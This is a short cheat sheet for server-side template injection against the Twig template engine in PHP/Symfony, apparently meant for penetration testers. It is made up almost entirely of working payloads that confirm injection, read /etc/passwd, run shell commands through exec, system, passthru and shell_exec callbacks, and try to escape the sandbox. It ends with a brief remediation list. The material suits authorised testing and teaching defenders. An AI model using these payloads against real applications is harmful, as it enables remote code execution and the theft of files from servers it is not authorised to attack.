# Twig / PHP — Template Engine (Symfony)

## Summary
Twig is the default template engine for Symfony and is also used standalone.

## Identification
```jinja2
{{7*7}}       → 49
{{7*'7'}}     → 49      (PHP casts to int — different from Jinja2)
{{_self}}     → Twig environment object dump
{{_self.env}} → Environment details
```

## Basic Confirmation
```jinja2
{{7*7}}
{{'7'*7}}
```

## Object Access
```jinja2
{{_self}}
{{_self.env}}
{{_self.env.getLoader()}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("cat /etc/passwd")}}
```

## Read Files
```jinja2
{{'/etc/passwd'|file_excerpt(1,30)}}
{{'file:///etc/passwd'|file_get_contents}}
```

## RCE

```jinja2
# Using registerUndefinedFilterCallback + exec
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Using sort filter
{{['id']|filter('exec')}}

# Using map
{{['id']|map('system')}}

# One-liner
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /etc/passwd")}}
```

## Sandbox Escape (disabled _self)

```jinja2
# If _self is unavailable, try:
{{"{{"}}
{% set x = 'id' %}
{{["cat /etc/passwd"]|filter("passthru")}}

# Using WordPress / Twig integration
{{['id']|map('shell_exec')}}
```

## Remediation
- Disable `_self` in template context
- Use Twig sandbox extension
- Never pass user input to template
- Filter and map callbacks should be whitelisted
